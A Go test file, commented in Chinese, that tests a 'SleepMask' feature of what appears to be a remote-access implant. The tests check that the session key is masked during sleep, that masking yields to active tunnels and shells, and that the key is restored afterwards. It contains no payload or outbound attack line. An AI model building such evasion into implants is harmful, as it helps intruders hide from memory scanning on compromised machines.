package app

import (
	"bytes"
	"testing"
	"time"

	"implant/core/encrypt"
)

// 遮蔽必须"按片让路"：活跃会话（隧道/交互 shell）的收发不能被整个睡眠周期挡住。
// 这是把 mask 扩展到持久传输的前提 —— 否则实时隧道会被卡住数十秒。

func setupMaskTest(t *testing.T) {
	t.Helper()
	old := maskSliceDuration
	maskSliceDuration = 20 * time.Millisecond
	t.Cleanup(func() { maskSliceDuration = old })

	oldMgr := encrypt.GlobalClientKeyManager
	t.Cleanup(func() { encrypt.GlobalClientKeyManager = oldMgr })

	encrypt.InitClientKeyManager("mask-test")
	if err := encrypt.GlobalClientKeyManager.SetSessionKey(
		bytes.Repeat([]byte{0x11}, 16), bytes.Repeat([]byte{0x22}, 32)); err != nil {
		t.Fatalf("设置会话密钥失败: %v", err)
	}
}

func TestSleepMaskYieldsToActiveKeyUser(t *testing.T) {
	setupMaskTest(t)

	done := make(chan struct{})
	go func() {
		SleepMask(400 * time.Millisecond)
		close(done)
	}()

	// 等它先遮蔽起来，再模拟一个活跃会话要用密钥
	time.Sleep(60 * time.Millisecond)
	start := time.Now()
	if _, err := encrypt.EncryptWithSessionKey([]byte("tunnel-packet")); err != nil {
		t.Fatalf("加密失败: %v", err)
	}
	waited := time.Since(start)

	// 片长 20ms：等待应在两片以内，而不是 400ms 的整个睡眠周期
	if waited > 150*time.Millisecond {
		t.Fatalf("活跃会话等待了 %v，遮蔽没有按片让路（片长 %v）", waited, maskSliceDuration)
	}
	<-done
}

// TestSleepMaskWithoutKeyManager 没有密钥管理器时只睡眠，不 panic
func TestSleepMaskWithoutKeyManager(t *testing.T) {
	old := encrypt.GlobalClientKeyManager
	encrypt.GlobalClientKeyManager = nil
	t.Cleanup(func() { encrypt.GlobalClientKeyManager = old })

	start := time.Now()
	SleepMask(30 * time.Millisecond)
	if elapsed := time.Since(start); elapsed < 20*time.Millisecond {
		t.Fatalf("应至少睡眠 30ms，实际 %v", elapsed)
	}
}

// TestSleepMaskRestoresAfterSleep 睡眠结束后密钥必须已还原（否则后续收发全废）
func TestSleepMaskRestoresAfterSleep(t *testing.T) {
	setupMaskTest(t)

	before, err := encrypt.GlobalClientKeyManager.GetSessionKey()
	if err != nil {
		t.Fatalf("取密钥失败: %v", err)
	}
	SleepMask(80 * time.Millisecond)

	after, err := encrypt.GlobalClientKeyManager.GetSessionKey()
	if err != nil {
		t.Fatalf("睡眠后取密钥失败: %v", err)
	}
	if !bytes.Equal(before, after) {
		t.Fatal("睡眠结束后密钥未还原")
	}
	if encrypt.GlobalClientKeyManager.MaskedForTest() {
		t.Fatal("睡眠结束后仍处于遮蔽状态")
	}
	// 睡眠结束后必须能正常加解密
	ct, err := encrypt.EncryptWithSessionKey([]byte("after-sleep"))
	if err != nil {
		t.Fatalf("睡眠后加密失败: %v", err)
	}
	pt, err := encrypt.DecryptWithSessionKey(ct)
	if err != nil || string(pt) != "after-sleep" {
		t.Fatalf("睡眠后解密失败: %v %q", err, pt)
	}
}
